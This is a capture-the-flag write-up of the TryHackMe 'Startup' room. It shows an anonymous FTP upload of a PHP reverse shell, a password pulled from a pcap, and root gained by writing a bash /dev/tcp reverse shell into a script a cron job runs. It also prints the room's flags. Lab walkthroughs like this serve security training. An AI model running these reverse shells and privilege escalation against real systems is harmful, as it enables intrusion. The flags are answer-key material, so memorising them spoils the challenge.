Swatish Attaluri
Date: 06-06-2021
## Startup - Tryhackme
### Machine IP: 10.10.225.152
#### Nmap scan
```bash
$ nmap -sV -sC -oN ports  10.10.225.152
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-06 19:55 IST
Nmap scan report for 10.10.225.152
Host is up (0.15s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.17.6.214
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.95 seconds
```
We can see that ftp, ssh and http are open.
#### Gobuster
```bash
$ gobuster dir -u 10.10.225.152 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.225.152
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/06 20:09:06 Starting gobuster in directory enumeration mode
===============================================================
/files                (Status: 301) [Size: 314] [--> http://10.10.225.152/files/]
Progress: 16494 / 220561 (7.48%)                                                                                
```
Lets check out files
We see ftp directory, notes.txt, important.jpg
#### FTP login
We can login ftp as anonymous and put php-reverse-shell
```bash
$ ftp 10.10.225.152                                                                                   
Connected to 10.10.225.152.
220 (vsFTPd 3.0.3)
Name (10.10.225.152:starboy): Anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
ftp> cd ftp
250 Directory successfully changed.
ftp> put php-reverse-shell.php 
local: php-reverse-shell.php remote: php-reverse-shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5492 bytes sent in 0.00 secs (69.8344 MB/s)
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxrwxr-x    1 112      118          5492 Jun 06 14:56 php-reverse-shell.php
226 Directory send OK.
ftp> 
```
#### Gaining a reverse shell
Now we can browse to MACHINE-IP/files/php-reverse-shell.php to gain a reverse shell in out nc listener.
```bash
$ nc -lvnp 8888                                                                                       
listening on [any] 8888 ...
connect to [10.17.6.214] from (UNKNOWN) [10.10.225.152] 36336
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 15:02:38 up 39 min,  0 users,  load average: 0.00, 0.00, 0.03
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ls
bin
boot
dev
etc
home
incidents
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
recipe.txt
root
run
sbin
snap
srv
sys
tmp
usr
vagrant
var
vmlinuz
vmlinuz.old
$ cat recipe.txt
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love. 
$ ls /home
lennie
```
We find a folder called incidents. We see a file called suspicious.pcapng lets download it to our local machine.
```bash
$ strings suspicious.pcapng
[sudo] password for www-data: 
@       c4ntg3t3n0ughsp1c3
6%      @
Sorry, try again.
[sudo] password for www-data: 
^/Sorry, try again.
[sudo] password for www-data: 
c4ntg3t3n0ughsp1c3
```
As password on sudo for www-data is wrong.  Also, lennie is  another user on this machine.
We will see if this password works for lennie.
```bash
www-data@startup:/$ su lennie
Password: c4ntg3t3n0ughsp1c3
lennie@startup:/$ ls  
bin   home            lib         mnt         root  srv  vagrant
boot  incidents       lib64       opt         run   sys  var
dev   initrd.img      lost+found  proc        sbin  tmp  vmlinuz
etc   initrd.img.old  media       recipe.txt  snap  usr  vmlinuz.old
lennie@startup:/$ cd /home/lennie/
lennie@startup:~$ ls
Documents  scripts  user.txt
lennie@startup:~$ cat user.txt 
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
```
#### Privilege Escalation
```bash
lennie@startup:~$ ls
Documents  scripts  user.txt
lennie@startup:~$ cd scripts
lennie@startup:~/scripts$ ls
planner.sh  startup_list.txt
lennie@startup:~/scripts$ ls -l
total 8
-rwxr-xr-x 1 root root 77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root root  1 Jun  8 08:02 startup_list.txt
lennie@startup:~/scripts$ cat planner.sh 
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
lennie@startup:~/scripts$ cat startup_list.txt 
lennie@startup:~/scripts$ 
```
We see that both the files inside the scripts directory are owned by root.
The file planner.sh also executes a file print.sh in /etc.
Lets see who owned that file.
```bash
$ ls -l /etc/print.sh 
-rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh
```
As lennie ownes this file we can edit this file.
Also, when the planner.sh is executed as root this file will also we executed as root.
How do we execute it?
Is it executed by cron?
Lets find it by using pspy64 which monitors linux process without root permissions.
```bash
lennie@startup:~$ wget [LOCAL_IP]:8000/pspy64
--2021-06-08 08:19:37--  http://10.17.6.214:8000/pspy64
Connecting to 10.17.6.214:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64              100%[===================>]   2.94M  2.02MB/s    in 1.5s    

2021-06-08 08:19:39 (2.02 MB/s) - ‘pspy64’ saved [3078592/3078592]

lennie@startup:~$ ls
Documents  pspy64  scripts  user.txt
lennie@startup:~$ chmod +x pspy64
lennie@startup:~$ ./pspy64
2021/06/08 08:21:01 CMD: UID=0    PID=1856   | 
2021/06/08 08:21:01 CMD: UID=0    PID=1855   | /bin/bash /home/lennie/scripts/planner.sh 
```
We see planner.sh is a cronjob.
Lets put a bash reverse shell in /etc/print.sh
```bash
lennie@startup:~$ echo "bash -c 'exec bash -i &>/dev/tcp/[Local_IP]/9001 <&1'" > /etc/print.sh
lennie@startup:~$ cat /etc/print.sh 
bash -c 'exec bash -i &>/dev/tcp/10.17.6.214/9001 <&1'
```
On our machine lets use netcat on port 9001
ref for bash reverse shell: https://gtfobins.github.io/gtfobins/bash/#reverse-shell.
Within a few minutes we get our shell.
```bash
$ nc -lvnp 9001                       
listening on [any] 9001 ...
connect to [10.17.6.214] from (UNKNOWN) [10.10.242.177] 50464
bash: cannot set terminal process group (1897): Inappropriate ioctl for device
bash: no job control in this shell
root@startup:~# ls
ls
root.txt
root@startup:~# cat root.txt
cat root.txt
THM{f963aaa6a430f210222158ae15c3d76d}
```
#### Answers
```
What is the secret spicy soup recipe?
love
What are the contents of user.txt?
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
What are the contents of root.txt?
THM{f963aaa6a430f210222158ae15c3d76d}
```
#cron 
#bash